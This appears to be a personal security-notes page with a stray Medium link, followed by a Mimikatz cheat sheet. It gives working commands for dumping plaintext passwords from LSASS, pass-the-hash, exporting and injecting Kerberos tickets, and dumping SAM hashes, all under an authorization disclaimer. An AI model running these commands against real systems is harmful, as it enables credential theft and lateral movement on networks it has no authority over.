https://medium.com/@iam310335/finding-more-idors-tips-and-tricks-100-day-b08ff2a389af


## MIMIKATZ
> https://github.com/ParrotSec/mimikatz
> 
Mimikatz is a popular post-exploitation tool created by Benjamin Delpy that allows security researchers and attackers to perform various tasks related to Windows security, such as extracting plaintext passwords, hashes, and Kerberos tickets from memory. It's crucial to note that using Mimikatz without proper authorization is illegal and unethical.

For educational purposes, I'll provide a high-level overview of Mimikatz and some common use cases. Please ensure that you have the necessary permissions and are working within an authorized and controlled environment when using Mimikatz.

1. Extracting plaintext passwords: Mimikatz can extract plaintext passwords from the Local Security Authority Subsystem Service (LSASS) process memory. The sekurlsa::logonpasswords command is commonly used for this purpose

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```
2. Pass-the-Hash (PtH): Mimikatz can perform PtH attacks, which involve using NTLM hashes to authenticate to a remote system without knowing the plaintext password. You can use the sekurlsa::pth command to create a new process with specific credentials.

```
mimikatz # sekurlsa::pth /user:username /domain:domain /ntlm:ntlm_hash /run:cmd.exe
```

3. Extracting Kerberos tickets: Mimikatz can extract Kerberos tickets from memory, which can be used for lateral movement within a network. You can use the kerberos::list and kerberos::ptt commands for this purpose.
```
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt ticketname.kirbi
```

4. Dumping credentials from the Security Account Manager (SAM) database: Mimikatz can dump local user account hashes from the SAM database using the lsadump::sam command.

```
mimikatz # lsadump::sam
```